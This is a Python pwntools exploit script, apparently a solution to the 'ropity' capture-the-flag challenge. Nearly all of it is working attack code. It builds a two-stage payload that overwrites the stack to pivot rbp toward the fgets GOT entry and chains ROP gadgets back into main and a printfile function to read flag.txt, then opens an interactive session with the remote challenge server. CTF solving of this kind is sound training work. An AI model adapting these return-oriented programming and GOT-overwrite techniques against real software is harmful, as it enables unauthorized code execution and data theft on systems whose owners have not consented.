#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched")

context.binary = exe
context.terminal = "alacritty -e".split()


def conn():
    if args.REMOTE:
        io = remote("ropity.chal.imaginaryctf.org", 1337)
    else:
        if args.GDB:
            io = gdb.debug([exe.path], aslr=False, api=False, gdbscript="""
            set follow-fork-mode parent
            b *printfile
            """)
        else:
            io = process([exe.path])
            #gdb.attach(io)
    return io


def main():
    io = conn()
    payload = b""
    payload += p64(exe.got['fgets']-0x10)
    payload += p64(exe.sym['main']+12)
        
    io.sendline(B"A" * 0x8 + payload)

    import time
    time.sleep(1)
    input('continue')

    # 0x0000000040101a: ret;
    # 0x0000000040111d: pop rbp; ret; 

    payload = b""
    payload += p64(0x0000000040111d)
    # rbp
    payload += p64(0x404030)
    payload += p64(exe.sym['main']+28)
    payload += p64(exe.sym['printfile'])
    
    io.sendline(
        b"flag.txt".ljust(0x10, b"\x00") + \
        p64(exe.sym['main']+38) + \
        # got
        p64(exe.sym['main']+38) + \
        payload)
    
    io.interactive()


if __name__ == "__main__":
    main()
